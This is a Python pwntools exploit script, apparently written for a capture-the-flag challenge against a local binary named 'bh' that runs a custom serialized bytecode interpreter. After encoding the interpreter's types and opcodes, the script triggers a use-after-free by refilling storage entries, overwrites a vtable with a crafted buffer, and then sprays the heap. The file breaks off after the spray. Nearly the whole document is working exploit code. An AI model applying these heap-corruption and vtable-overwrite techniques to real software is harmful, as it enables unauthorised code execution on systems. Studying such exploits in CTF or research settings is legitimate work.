from pwn import *
import sys

BIN = '/home/daniel/Desktop/files/bh'
TYPES = {'ITEM': 0, 'NUMBER': 1, 'STRING': 2, 'STORAGE': 3}
OPCODES = {'ADD': 0, 'DEFINE': 1, 'JUMP': 2, 'SET': 3, 'EVAL': 4, 'IF': 5, 'RETURN': 6, 'CONVERT': 7}

class Item(object):
    def __init__(self):
        self._type = TYPES['ITEM']

    def encode_with_type(self):
        return p8(self._type) + self.encode()

    def encode(self):
        pass

class Number(Item): 
    def __init__(self, n):
        self._n = n
        self._type = TYPES['NUMBER']

    def encode(self):
        return p32(self._n)

class String(Item):
    def __init__(self, s):
        self._s = s
        self._type = TYPES['STRING']

    def encode(self):
        return Number(len(self._s)).encode() + self._s

class Storage(Item):
    def __init__(self, d):
        self._d = {}
        types_convert = {str: String, int: Number, dict: Storage}
        self._type = TYPES['STORAGE']

        for k in d:
        	if not isinstance(k, str):
        		raise Exception('Invalid key type')

        	if type(d[k]) not in types_convert:
        		raise Exception('Invalid value type')

        	new_key = String(k)
        	new_val = types_convert[type(d[k])](d[k])
        	self._d[new_key] = new_val


    def encode(self):
        res = Number(len(self._d)).encode()
        for k in self._d:
            res += k.encode_with_type()
            res += self._d[k].encode_with_type()
        return res


class Run(object):
    def __init__(self):
        self._p = process(BIN)
        self.recv_welcome_msg()

    def recv_welcome_msg(self):
        for i in xrange(3):
            sys.stdout.write(self.recv_buffer())

    def recv_buffer(self):
        try:
            l = u32(self._p.recv(4, timeout=1))
            d = self._p.recv(l, timeout=1)
        except:
            return ''
        return d

    def send_buffer(self, buf):
        pickle = p32(len(buf)) + buf
        # print 'Sending ' + pickle.encode('hex')
        self._p.send(pickle)

    def add(self, id1, id2):
    	pickle = p8(OPCODES['ADD'])
    	pickle += p8(id1)
    	pickle += p8(id2)

    	return pickle

    def set(self, storage_id, key_id, val_id):
        pickle = p8(OPCODES['SET'])
    	pickle += p8(storage_id)
    	pickle += p8(key_id)
    	pickle += p8(val_id)

    	return pickle

    def convert(self, id_to_convert, new_type):
        pickle = p8(OPCODES['CONVERT'])
        pickle += p8(id_to_convert)
        pickle += p8(TYPES[new_type])

        return pickle

    def define(self, item):
        pickle = p8(OPCODES['DEFINE'])
        pickle += item.encode_with_type()

        return pickle

    def return_id(self, id_to_ret):
        pickle = p8(OPCODES['RETURN'])
        pickle += p8(id_to_ret)

        return pickle

    def send_command(self, pickle):
    	self.send_buffer(pickle)
        return self.recv_buffer()

    def pasten(self):

    	# construct the storage
        pickle = self.define(Storage({}))
        for i in xrange(10):
            pickle += self.define(String('a'))
            pickle += self.define(Number(1))

            pickle += self.set(0, 2*i + 1, 2*i + 2)

        pickle += self.define(Number(0xAAAA))
        print self.send_command(pickle)

        # free the storage elements
        pickle = ''
        for i in xrange(10):
            pickle += self.set(0, 2*i + 1, 2*i + 2)

        pickle += self.define(Number(0xBBBB))
        print self.send_command(pickle)

        # clobber refs[15] vftable
        self.send_command('\x10\x10\x10\x0aAAAAAA' + self.define(Number(0XCCCC)))

        dummy_id = int(self.send_command(self.define(Number(0XDDDD))))

        # heap spray
        for i in xrange(0x300):
        	self.send_command('ABCD'*0x4000 + self.return_id(dummy_id))